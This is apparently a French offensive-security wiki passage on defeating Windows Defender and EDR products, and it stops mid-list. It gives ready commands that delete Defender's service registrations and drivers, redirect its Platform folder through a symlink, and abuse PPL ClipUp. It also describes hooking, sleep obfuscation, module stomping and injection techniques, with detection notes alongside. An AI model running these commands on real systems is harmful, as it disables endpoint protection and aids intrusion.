Le flux `:changelist` contient un blob chiffré avec RC4. Les builds analysés réutilisent une clé fixe de 256 octets ; le chiffrement ne constitue donc pas une frontière d’autorisation. Un plaintext valide possède un en-tête global de 24 octets (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, un CRC d’en-tête et un identifiant de transaction dérivé du payload), suivi d’un chemin de feedback UTF-16 terminé par un octet nul et d’un nombre quelconque d’éléments. Chaque élément possède un en-tête de 16 octets (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), suivi de données spécifiques à l’action se terminant par **exactement quatre octets NUL**. Chaque région d’en-tête et de données est vérifiée indépendamment avec le polynôme CRC-32 `0xEDB88320`, un état initial `0xFFFFFFFF` et **aucun XOR final** (`~CRC32`) ; l’état du CRC est réinitialisé pour chaque région.<sup>[[36]](#references)[[37]](#references)</sup>

Les identifiants d’action acceptés exposent ces primitives du kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Données de l’élément | Résultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Supprimer un fichier, y compris un fichier verrouillé |
| 2 | `[UTF-16 path]` | Supprimer un répertoire vide |
| 3 | `[Flags][source][destination]` | Déplacer un fichier vers un chemin protégé choisi par l’attaquant ; une destination vide signifie supprimer |
| 4 | `[Flags][key path]` | Supprimer récursivement une clé de registre |
| 5 | `[Flags][key path + "\\" + value]` | Supprimer une valeur de registre |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Créer ou mettre à jour une valeur de registre et créer les chemins de clé manquants |

Pour les actions 5 et 6, le séparateur clé/valeur sur le wire est **constitué de deux backslashes consécutifs** ; un chemin formaté conventionnellement ne sera pas correctement séparé. Le fichier de feedback reflète principalement la requête, mais les quatre premiers octets de données de chaque élément deviennent son `NTSTATUS` résultant. Pour les actions 1 et 2, qui ne possèdent pas de champ flags initial, BTR déplace le chemin dans les quatre octets réservés de fin afin de faire de la place pour ce statut.<sup>[[36]](#references)</sup>

### Workflow `BTR_CLI` et fenêtre de démarrage précoce

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implémente la chaîne complète : extraire `BTR.sys` de Defender local, créer `<random>.sys:changelist` et un flux de feedback, sérialiser, calculer les sommes de contrôle et chiffrer les actions chaînées, créer directement la clé de registre du service, puis appeler `NtLoadDriver` pour `-trigger now` ou laisser le pilote se charger au démarrage du système avec `-trigger boot`. La préparation directe du registre évite le chemin SCM normal `CreateServiceW` et ne génère donc **pas** d’événement d’installation de service portant l’ID 7045. Les artefacts déclenchés au démarrage peuvent ensuite être supprimés avec `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` n’est pas utilisable, car BTR effectue des opérations d’E/S sur des fichiers depuis `DriverEntry`, avant que la pile de stockage et le lien `SystemRoot` ne soient prêts. `Start=1`, associé au groupe de haute priorité `Boot Bus Extender`, s’exécute plutôt lors de la Phase 1 : NTFS est utilisable, mais de nombreux security drivers de démarrage système et services EDR en mode utilisateur ne sont pas encore initialisés. Les filtres de démarrage tels que `WdFilter` peuvent déjà être chargés, mais BTR peut supprimer leurs binaires ou leur configuration de service avant le démarrage suivant, et supprimer les exécutables des services avant que SCM ne les lance. ELAM ne comble pas cette faille, car BTR s’exécute après l’évaluation du démarrage et possède une signature Microsoft valide.<sup>[[36]](#references)</sup>

Plusieurs actions s’exécutent au sein d’une même transaction. Le PoC place l’Action 1 en tête pour le chemin codé en dur `\SystemRoot\Temp\BootClean.log` : BTR crée ce journal, puis traite sa propre demande de suppression et le supprime avant de se décharger. Cela réduit les éléments de preuve, tandis que le placement des retours dans `<random>.sys:<random>.dat` permet de supprimer simultanément le driver et les deux streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Corrélations de détection à signal élevé

Les règles fondées uniquement sur les signatures et la liste de blocage Microsoft des drivers vulnérables ne traitent pas l’abus des fonctionnalités prévues de BTR. Privilégiez les corrélations comportementales suivantes, tout en distinguant la lignée légitime de Defender d’un launcher arbitraire.<sup>[[36]](#references)</sup>

- **Sysmon 15 :** la création de `.sys:changelist` est universelle pour le staging de BTR. Un ADS `.dat` attaché au même `.sys` est particulièrement suspect, car Defender place normalement ses retours sous `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sans System 7045 :** corrélez la création directe de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenant `Args=...:changelist` et `Group=Boot Bus Extender` avec l’absence d’un événement d’installation SCM correspondant.
- **Sysmon 6 -> 23 :** corrélez le chargement d’un driver BTR connu provenant d’une lignée autre que Defender avec une suppression de fichier ultérieure attribuée à `System`/PID 4, notamment pour les binaires de sécurité.
- **Sysmon 11 -> 23 :** déclenchez une alerte lors de la création et de la suppression rapides de `\SystemRoot\Temp\BootClean.log` par `System`/PID 4.
- Restreignez et auditez l’attribution/l’activation de `SeLoadDriverPrivilege` ; une signature Microsoft seule ne suffit pas à établir la confiance lorsqu’un driver d’outil de sécurité est mis en staging par `cmd.exe`, PowerShell ou un processus inconnu.

## Abuser de Protected Process Light (PPL) pour altérer l’AV/EDR avec des LOLBINs

Protected Process Light (PPL) applique une hiérarchie de signataires/niveaux afin que seuls les processus protégés de niveau égal ou supérieur puissent altérer les uns les autres. À des fins offensives, si vous pouvez lancer légitimement un binaire compatible PPL et contrôler ses arguments, vous pouvez transformer une fonctionnalité bénigne (par exemple, la journalisation) en primitive d’écriture contrainte, adossée à PPL, contre les répertoires protégés utilisés par l’AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Ce qui permet à un processus de s’exécuter en tant que PPL
- L’EXE cible (ainsi que toutes les DLL chargées) doit être signé avec un EKU compatible PPL.
- Le processus doit être créé avec CreateProcess en utilisant les flags suivants : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible doit être demandé, correspondant au signataire du binaire (par exemple, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires anti-malware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Des niveaux incorrects entraîneront l’échec de la création.

Voir également une introduction plus générale à PP/PPL et à la protection de LSASS ici :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de launcher
- Helper open source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments à l’EXE cible) :
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schéma d’utilisation :
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitive LOLBIN : ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre permettant d'écrire un fichier journal vers un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture du fichier bénéficie du support PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez les chemins courts 8.3 pour cibler des emplacements normalement protégés.

Aides pour les chemins courts 8.3
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Déduire le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chaîne d'abus (abstraite)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` à l'aide d'un launcher (par exemple, CreateProcessAsPPL).
2) Transmettre l'argument de chemin du journal de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (par exemple, Defender Platform). Utilisez les noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert ou verrouillé par l'AV lors de son exécution (par exemple, MsMpEng.exe), planifier l'écriture au démarrage, avant le lancement de l'AV, en installant un service auto-start qui s'exécute de manière fiable plus tôt. Valider l'ordre de démarrage avec Process Monitor (journalisation du démarrage).
4) Au redémarrage, l'écriture supportée par PPL s'effectue avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Exemple d'invocation (chemins masqués/raccourcis pour des raisons de sécurité) :
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes et contraintes
- Vous ne pouvez pas contrôler le contenu écrit par ClipUp, uniquement son emplacement ; cette primitive convient à la corruption plutôt qu'à l'injection précise de contenu.
- Nécessite des privilèges d'administrateur local/SYSTEM pour installer/démarrer un service ainsi qu'une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Détections
- Création du processus `ClipUp.exe` avec des arguments inhabituels, en particulier lorsqu'il est lancé par des launchers non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Rechercher la création ou la modification de services précédant les échecs de démarrage de Defender.
- Surveillance de l'intégrité des fichiers sur les binaires/répertoires Platform de Defender ; créations/modifications inattendues effectuées par des processus avec des indicateurs de protected process.
- Télémétrie ETW/EDR : rechercher les processus créés avec `CREATE_PROTECTED_PROCESS` ainsi que l'utilisation anormale d'un niveau PPL par des binaires qui ne sont pas des binaires AV.

Mesures d'atténuation
- WDAC/Code Integrity : restreindre les binaires signés autorisés à s'exécuter en tant que PPL et les parents autorisés ; bloquer l'invocation de ClipUp en dehors des contextes légitimes.
- Hygiène des services : restreindre la création/modification de services à démarrage automatique et surveiller la manipulation de l'ordre de démarrage.
- Vérifier que la protection contre la falsification de Defender et les protections early-launch sont activées ; enquêter sur les erreurs de démarrage indiquant une corruption de binaire.
- Envisager de désactiver la génération des noms courts 8.3 sur les volumes hébergeant les outils de sécurité si cela est compatible avec votre environnement (tester rigoureusement).

## Falsification de Microsoft Defender via le détournement d'un symlink du dossier de version Platform

Windows Defender choisit la Platform depuis laquelle il s'exécute en énumérant les sous-dossiers de :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier dont la chaîne de version est la plus élevée selon l'ordre lexicographique (par exemple `4.18.25070.5-0`), puis démarre les processus du service Defender depuis ce dossier (en mettant à jour les chemins du service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux points de reparse de type répertoire (symlinks). Un administrateur peut exploiter cela pour rediriger Defender vers un chemin contrôlé par l'attaquant et réaliser un DLL sideloading ou une interruption du service.<sup>[[21]](#references)[[22]](#references)</sup>

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Possibilité de redémarrer ou de déclencher une nouvelle sélection de la Platform de Defender (redémarrage du service au démarrage)
- Seuls des outils intégrés sont nécessaires (`mklink`)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de Platform fait confiance aux entrées de répertoire et choisit la version la plus élevée selon l'ordre lexicographique sans vérifier que la cible se résout vers un chemin protégé/de confiance.

Étapes (exemple)
1) Préparer un clone accessible en écriture du dossier Platform actuel, par exemple `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un lien symbolique de répertoire de version supérieure dans Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s’exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` ainsi que la configuration du service et le registre reflétant cet emplacement.

Options de post-exploitation
- DLL sideloading/code execution : Déposez ou remplacez les DLL que Defender charge depuis son répertoire d’application afin d’exécuter du code dans les processus de Defender. Consultez la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Arrêt/refus du service : Supprimez le `version-symlink` afin qu’au prochain démarrage, le chemin configuré ne soit pas résolu et que Defender ne démarre pas :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Notez que cette technique ne fournit pas à elle seule d'escalade de privilèges ; elle nécessite des droits administrateur.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les équipes Red peuvent déplacer l'évasion au runtime hors de l'implant C2 et directement dans le module cible en hookant sa Import Address Table (IAT) et en redirigeant certaines API via du code position-independent (PIC) contrôlé par l'attaquant. Cela généralise l'évasion au-delà de la petite surface d'API exposée par de nombreux kits (p. ex. CreateProcessA), et étend les mêmes protections aux BOFs et aux DLLs de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approche générale
- Stagez un blob PIC à côté du module cible à l'aide d'un reflective loader (préfixé ou compagnon). Le PIC doit être autonome et position-independent.
- Lors du chargement de la DLL hôte, parcourez son IMAGE_IMPORT_DESCRIPTOR et patchez les entrées IAT correspondant aux imports ciblés (p. ex. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) afin qu'elles pointent vers de minces wrappers PIC.
- Chaque wrapper PIC exécute les évasions avant d'effectuer un tail-call vers l'adresse de l'API réelle. Les évasions typiques incluent :
- Masquage/démasquage de la mémoire autour de l'appel (p. ex. chiffrer les régions du beacon, RWX→RX, modifier les noms/permissions des pages), puis restauration après l'appel.
- Call-stack spoofing : construisez une stack bénigne et effectuez une transition vers l'API cible afin que l'analyse de la call stack corresponde aux frames attendues.<sup>[[9]](#references)</sup>
- Pour assurer la compatibilité, exportez une interface afin qu'un script Aggressor (ou équivalent) puisse enregistrer les API à hooker pour Beacon, les BOFs et les DLLs de post-exploitation.

Pourquoi utiliser l'IAT hooking ici
- Fonctionne avec tout code utilisant l'import hooké, sans modifier le code de l'outil ni dépendre de Beacon pour proxifier certaines API.
- Couvre les DLLs de post-exploitation : le hooking de LoadLibrary* permet d'intercepter les chargements de modules (p. ex. System.Management.Automation.dll, clr.dll) et d'appliquer le même masquage/stack evasion à leurs appels d'API.
- Rétablit l'utilisation fiable des commandes de post-exploitation qui créent des processus face aux détections basées sur la call stack, en wrappant CreateProcessA/W.

Schéma minimal d'IAT hook (pseudocode C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquer le patch après les relocations/ASLR et avant la première utilisation de l'import. Les reflective loaders comme TitanLdr/AceLdr démontrent le hooking pendant le DllMain du module chargé.
- Garder les wrappers très courts et compatibles PIC ; résoudre la véritable API via la valeur IAT originale capturée avant le patch ou via LdrGetProcedureAddress.
- Utiliser des transitions RW → RX pour le PIC et éviter de laisser des pages à la fois inscriptibles et exécutables.

Call-stack spoofing stub
- Les stubs PIC de style Draugr construisent une fausse chaîne d'appels (adresses de retour dans des modules bénins), puis effectuent un pivot vers la véritable API.
- Cela neutralise les détections qui attendent des stacks canoniques de Beacon/BOFs vers des APIs sensibles.
- Combiner avec des techniques de stack cutting/stack stitching pour atterrir dans les frames attendues avant le prologue de l'API.

Intégration opérationnelle
- Préfixer les DLLs post-ex par le reflective loader afin que le PIC et les hooks s'initialisent automatiquement lorsque la DLL est chargée.
- Utiliser un script Aggressor pour enregistrer les APIs cibles afin que Beacon et les BOFs bénéficient de manière transparente du même chemin d'évasion sans modification du code.

Considérations de détection/DFIR
- Intégrité de l'IAT : entrées qui se résolvent vers des adresses non-image (heap/anon) ; vérification périodique des pointeurs d'import.
- Anomalies de stack : adresses de retour n'appartenant pas aux images chargées ; transitions brutales vers du PIC non-image ; ascendance RtlUserThreadStart incohérente.
- Télémétrie du loader : écritures in-process dans l'IAT, activité précoce de DllMain qui modifie les import thunks, régions RX inattendues créées au chargement.
- Évasion du chargement d'image : en cas de hooking de LoadLibrary*, surveiller les chargements suspects d'assemblies automation/clr corrélés à des événements de memory masking.

Blocs de construction et exemples associés
- Reflective loaders qui effectuent du IAT patching pendant le chargement (p. ex. TitanLdr, AceLdr)
- Memory masking hooks (p. ex. simplehook) et PIC de stack-cutting (stackcutting)
- Stubs PIC de call-stack spoofing (p. ex. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via un PICO résident

Si vous contrôlez un reflective loader, vous pouvez hooker les imports **pendant** `ProcessImports()` en remplaçant le pointeur `GetProcAddress` du loader par un resolver personnalisé qui vérifie d'abord les hooks :<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Construire un **PICO résident** (objet PIC persistant) qui survit après que le PIC transitoire du loader se soit libéré.
- Exporter une fonction `setup_hooks()` qui écrase le resolver d'imports du loader (p. ex. `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, ignorer les imports par ordinal et utiliser une recherche de hooks basée sur un hash comme `__resolve_hook(ror13hash(name))`. Si un hook existe, le retourner ; sinon, déléguer au véritable `GetProcAddress`.
- Enregistrer les cibles de hooks au link time avec les entrées Crystal Palace `addhook "MODULE$Func" "hook"`. Le hook reste valide car il réside dans le PICO résident.

Cela produit une **redirection IAT au moment de l'import** sans patcher la code section de la DLL chargée après le chargement.

### Forcer les imports hookables lorsque la cible utilise le PEB-walking

Les hooks au moment de l'import ne se déclenchent que si la fonction se trouve réellement dans l'IAT de la cible. Si un module résout les APIs via un PEB-walk + hash (sans entrée d'import), forcer un import réel afin que le chemin `ProcessImports()` du loader puisse l'intercepter :

- Remplacer la résolution d'exports basée sur un hash (p. ex. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur émet une entrée IAT, permettant l'interception lorsque le reflective loader résout les imports.

### Obfuscation sleep/idle de style Ekko sans patcher `Sleep()`

Au lieu de patcher `Sleep`, hooker les primitives réelles de wait/IPC utilisées par l'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les waits longs, encapsuler l'appel dans une chaîne d'obfuscation de style Ekko qui chiffre l'image en mémoire pendant l'idle :<sup>[[31]](#references)[[27]](#references)</sup>

- Utiliser `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des frames `CONTEXT` forgées.
- Chaîne typique (x64) : définir l'image sur `PAGE_READWRITE` → chiffrement RC4 via `advapi32!SystemFunction032` sur l'image mappée complète → effectuer le wait bloquant → déchiffrement RC4 → **restaurer les permissions par section** en parcourant les sections PE → signaler la fin.
- `RtlCaptureContext` fournit un template `CONTEXT` ; le cloner dans plusieurs frames et définir les registres (`Rip/Rcx/Rdx/R8/R9`) pour invoquer chaque étape.

Détail opérationnel : retourner « success » pour les waits longs (p. ex. `WAIT_OBJECT_0`) afin que l'appelant poursuive son exécution pendant que l'image est masquée. Ce pattern dissimule le module aux scanners pendant les fenêtres d'idle et évite la signature classique de `Sleep()` patché.

Idées de détection (basées sur la télémétrie)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- Utilisation de `advapi32!SystemFunction032` sur de grands buffers contigus de la taille de l'image.
- `VirtualProtect` sur une large plage, suivi d'une restauration personnalisée des permissions par section.

### Enregistrement CFG runtime pour les gadgets de sleep-obfuscation

Sur les cibles où CFG est activé, le premier saut indirect vers un gadget au milieu d'une fonction tel que `jmp [rbx]` ou `jmp rdi` fera généralement crasher le processus avec `STATUS_STACK_BUFFER_OVERRUN`, car le gadget n'est pas présent dans les métadonnées CFG du module. Pour maintenir les chaînes de style Ekko/Kraken dans les processus hardenés :<sup>[[30]](#references)</sup>

- Enregistrer chaque destination indirecte utilisée par la chaîne avec `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` et des entrées `CFG_CALL_TARGET_VALID`.
- Pour les adresses situées dans des images chargées (`ntdll`, `kernel32`, `advapi32`), le `MEMORY_RANGE_ENTRY` doit commencer à la **base de l'image** et couvrir la **taille complète de l'image**.
- Pour les régions manually mapped/PIC/stomped, utiliser la **base d'allocation** et la taille de l'allocation.
- Marquer non seulement le gadget de dispatch, mais aussi les exports atteints indirectement (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, les syscalls de wait/event) ainsi que toutes les sections exécutables contrôlées par l'attaquant qui deviendront des cibles indirectes.

Cela transforme les chaînes de sleep de type ROP/JOP, qui « ne fonctionnent que dans les processus sans CFG », en une primitive réutilisable pour `explorer.exe`, les browsers, `svchost.exe` et autres endpoints compilés avec `/guard:cf`.

### Stack spoofing compatible CET pour les threads en sleep

Le remplacement complet de `CONTEXT` est bruyant et peut échouer sur les systèmes CET Shadow Stack, car un `Rip` spoofé doit toujours correspondre au shadow stack matériel. Un pattern de sleep-masking plus sûr est le suivant :<sup>[[30]](#references)</sup>

- Choisir un autre thread du même processus et lire les limites de stack de son `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Sauvegarder le TEB/TIB réel du thread courant.
- Capturer le contexte réel du thread en sleep avec `GetThreadContext`.
- Copier **uniquement** le `Rip` réel dans le contexte spoofé, en laissant le `Rsp`/l'état de stack spoofé intact.
- Pendant la fenêtre de sleep, copier le `NT_TIB` du thread spoofé dans le TEB courant afin que les stack walkers déroulent la stack dans une plage légitime.
- Une fois le wait terminé, restaurer le TIB et le contexte du thread d'origine.

Cela préserve un instruction pointer cohérent avec CET tout en induisant en erreur les stack walkers EDR qui font confiance aux métadonnées de stack du TEB pour valider les unwinds.

### Alternative basée sur les APC : Kraken Mask

Si le dispatch par timer queue est trop caractéristique, la même séquence sleep-encrypt-spoof-restore peut être exécutée depuis un helper thread suspendu au moyen d'APCs en file d'attente :<sup>[[27]](#references)</sup>

- Créer un helper thread avec `NtTestAlert` comme entrypoint.
- Mettre en file les frames `CONTEXT`/APCs préparés avec `NtQueueApcThread` et les traiter avec `NtAlertResumeThread`.
- Stocker l'état de la chaîne sur le heap plutôt que sur la stack du helper afin d'éviter d'épuiser la stack thread par défaut de 64 KB.
- Utiliser `NtSignalAndWaitForSingleObject` pour signaler atomiquement l'event de démarrage et bloquer.
- Suspendre le thread principal avant de restaurer le TIB/contexte (`NtSuspendThread` → restore → `NtResumeThread`) afin de réduire la fenêtre de race pendant laquelle un scanner pourrait intercepter une stack partiellement restaurée.

Cela remplace la signature `CreateTimerQueueTimer` + `NtContinue` par une signature helper-thread/APC tout en conservant les mêmes objectifs de masking RC4 et de stack-spoofing.

Idées de détection supplémentaires
- `NtSetInformationVirtualMemory` avec `VmCfgCallTargetInformation` peu avant des sleeps, waits ou dispatchs APC.
- `GetThreadContext`/`SetThreadContext` autour de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` suivi d'écritures directes dans les limites de stack du TEB/TIB du thread courant.
- Chaînes `NtQueueApcThread`/`NtAlertResumeThread` qui atteignent indirectement `SystemFunction032`, `VirtualProtect` ou des helpers de restauration des permissions de section.
- Utilisation répétée de courtes signatures de gadgets telles que `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`) comme pivots de dispatch dans des modules signés.


## Precision Module Stomping

Le module stomping exécute des payloads depuis la **section `.text` d'une DLL déjà mappée dans le processus cible** au lieu d'allouer une mémoire exécutable privée évidente ou de charger une nouvelle DLL sacrifiable. La cible de l'overwrite doit être une **image chargée, adossée au disque**, dont l'espace de code peut absorber le payload sans corrompre les chemins de code dont le processus a encore besoin.<sup>[[1]](#references)[[2]](#references)</sup>

### Sélection fiable de la cible

Le stomping naïf de modules courants tels que `uxtheme.dll` ou `comctl32.dll` est fragile : la DLL peut ne pas être chargée dans le processus distant, et une région de code trop petite fera crasher le processus. Un workflow plus fiable est le suivant :

1. Énumérer les modules du processus cible et conserver une **include list contenant uniquement les noms** des DLLs déjà chargées.
2. Construire d'abord le payload et relever sa **taille exacte en octets**.
3. Scanner les DLLs candidates sur le disque et comparer le **`Misc_VirtualSize` de la section PE `.text`** à la taille du payload. Cela est plus important que la taille du fichier, car cette valeur reflète la taille de la section exécutable **une fois mappée en mémoire**.
4. Parser l'**Export Address Table (EAT)** et choisir le RVA d'une fonction exportée comme offset de début du stomp.
5. Calculer le **blast radius** : si le payload dépasse la limite de la fonction sélectionnée, il écrasera les exports adjacents placés après celle-ci en mémoire.

Helpers typiques de recon/sélection observés dans la nature :
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notes opérationnelles
- Privilégier les DLLs **déjà chargées** dans le processus distant afin d’éviter la télémétrie de `LoadLibrary`/des chargements d’images inattendus.
- Privilégier les exports rarement exécutés par l’application cible ; sinon, les chemins de code normaux peuvent atteindre les octets modifiés avant ou après la création du thread.
- Les implants volumineux nécessitent souvent de remplacer l’intégration du shellcode depuis un littéral de chaîne par un **tableau d’octets/initialiseur entre accolades**, afin que le buffer complet soit correctement représenté dans le code source de l’injecteur.

Idées de détection
- Écritures distantes dans des pages exécutables adossées à une **image** (`MEM_IMAGE`, `PAGE_EXECUTE*`) plutôt que dans les allocations privées RWX/RX plus courantes.
- Points d’entrée d’exports dont les octets en mémoire ne correspondent plus au fichier de référence sur disque.
- Threads distants ou pivots de contexte qui commencent leur exécution dans un export légitime d’une DLL dont les premiers octets ont été récemment modifiés.
- Séquences suspectes de `VirtualProtect(Ex)` / `WriteProcessMemory` ciblant les pages `.text` d’une DLL, suivies de la création d’un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) est une technique d’**injection de processus / d’évasion EDR** qui évite le chemin classique d’écriture distante (`VirtualAllocEx` + `WriteProcessMemory`). Au lieu de copier des octets dans une cible déjà en cours d’exécution, elle exploite le fait que Windows **copie certains paramètres de démarrage de `CreateProcessW` dans le processus enfant** et les stocke dans `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Supports pouvant être empoisonnés et copiés par `CreateProcessW`

Les supports utiles sont :

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (avec `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Contraintes pratiques des supports :

- `lpCommandLine` doit pointer vers une mémoire **inscriptible** pour `CreateProcessW` et est limité à **32 767 caractères Unicode**, terminateur nul inclus.
- `lpEnvironment` doit être un bloc d’environnement Unicode composé de chaînes successives `NAME=VALUE\0`, terminées par un `\0` supplémentaire.
- `lpReserved` est officiellement réservé ; le mapping vers `ShellInfo` doit donc être considéré comme un détail d’implémentation plutôt que comme un contrat documenté stable.

Cela transforme la création normale d’un processus en **primitive de transfert de payload**. L’opérateur crée le processus enfant avec des données de démarrage contrôlées par l’attaquant et laisse Windows effectuer la copie interprocessus.

### Flux de recherche distant sans APIs d’écriture distante

Après la création de l’enfant, résoudre le buffer copié avec des primitives **en lecture seule** :

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtenir `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lire le `PEB` distant
3. Suivre `PEB.ProcessParameters`
4. Lire `RTL_USER_PROCESS_PARAMETERS`
5. Utiliser le pointeur sélectionné :
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flux minimal :
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Exécution du parameter buffer copié

La région de paramètres copiée est généralement `RW`, et non exécutable. Une chaîne P3 courante est la suivante :

1. Créer normalement le processus (pas en état suspendu)
2. Rendre la page de paramètres choisie exécutable avec `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Réutiliser le handle du thread principal déjà retourné dans `PROCESS_INFORMATION`
4. Rediriger l'exécution avec `NtSetContextThread` (`CONTEXT_CONTROL`, écraser `RIP`)

Contrairement aux workflows classiques de thread hijacking, cela **ne nécessite pas** `SuspendThread` / `ResumeThread` ; le contexte peut être modifié directement sur le handle du thread principal retourné.

Cela évite plusieurs APIs généralement surveillées pour l'injection :

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
